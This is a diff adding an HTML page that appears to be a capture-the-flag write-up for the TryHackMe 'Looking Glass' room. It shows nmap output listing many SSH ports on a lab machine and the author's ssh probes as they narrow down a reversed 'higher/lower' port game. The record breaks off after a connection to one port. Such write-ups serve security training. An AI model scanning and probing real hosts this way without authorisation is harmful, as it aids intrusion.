@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration rustscan &#43; nmap | ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13641/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13642/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn[...MAD LONG OUTPUT...]13991/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13992/tcp open ssh syn-ack Dropbear sshd (protocol 2." />
+<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/looking-glass/looking-glass/" />
+
+
+    <title>
+        
+             :: Zer0ne blog 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
+    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Enumeration rustscan &#43; nmap | ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13641/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13642/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn[...MAD LONG OUTPUT...]13991/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13992/tcp open ssh syn-ack Dropbear sshd (protocol 2.">
+<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
+<meta itemprop="wordCount" content="1255"><meta itemprop="image" content="http://localhost:1313/" />
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Enumeration rustscan &#43; nmap | ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13641/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13642/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn[...MAD LONG OUTPUT...]13991/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13992/tcp open ssh syn-ack Dropbear sshd (protocol 2."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Enumeration rustscan &#43; nmap | ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13641/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13642/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn[...MAD LONG OUTPUT...]13991/tcp open ssh syn-ack Dropbear sshd (protocol 2.0)| ssh-hostkey: | 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74&#43;&#43;BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ&#43;yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1&#43;3OFeuDopeQMVf8FxsiD2/MLaETG&#43;l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA&#43;okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn13992/tcp open ssh syn-ack Dropbear sshd (protocol 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/looking-glass/looking-glass/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
+
+<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://localhost:1313/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">#&gt;</span>
+            <span class="logo__text">0/1</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/looking-glass/looking-glass/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h2 id="enumeration">Enumeration</h2>
+<h3 id="rustscan--nmap">rustscan + nmap</h3>
+<pre tabindex="0"><code>| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13641/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13642/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+
+[...MAD LONG OUTPUT...]
+
+13991/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13992/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13996/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13997/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13998/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+13999/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>WTF is all those open ports? This scan took me a bit&hellip;</p>
+<p>All of those are SSH??? (lol)</p>
+<p>ok This was a fun trickery: if you connect to any port it says either &ldquo;higher&rdquo; or &ldquo;lower&rdquo;, but its actually the opposite you should do.</p>
+<p>By example I connected to the very last open port and it said &ldquo;higher&rdquo;</p>
+<pre tabindex="0"><code>└──╼ $ssh 10.10.20.224 -p 13999
+The authenticity of host &#39;[10.10.20.224]:13999 ([10.10.20.224]:13999)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[10.10.20.224]:13999&#39; (RSA) to the list of known hosts.
+Higher
+</code></pre><p>So let&rsquo;s try random ports lower</p>
+<pre tabindex="0"><code>└──╼ $ssh 10.10.20.224 -p 11975
+The authenticity of host &#39;[10.10.20.224]:11975 ([10.10.20.224]:11975)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[10.10.20.224]:11975&#39; (RSA) to the list of known hosts.
+Lower
+Connection to 10.10.20.224 closed.
+</code></pre><p>So I can do this an keep on reducing the range (wow repetitive tasks are so much fun)</p>
+<p>After playing &ldquo;hot and cold&rdquo; we get this:</p>
+<pre tabindex="0"><code>└──╼ $ssh 10.10.20.224 -p 12612
+The authenticity of host &#39;[10.10.20.224]:12612 ([10.10.20.224]:12612)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[10.10.20.224]:12612&#39; (RSA) to the list of known hosts.
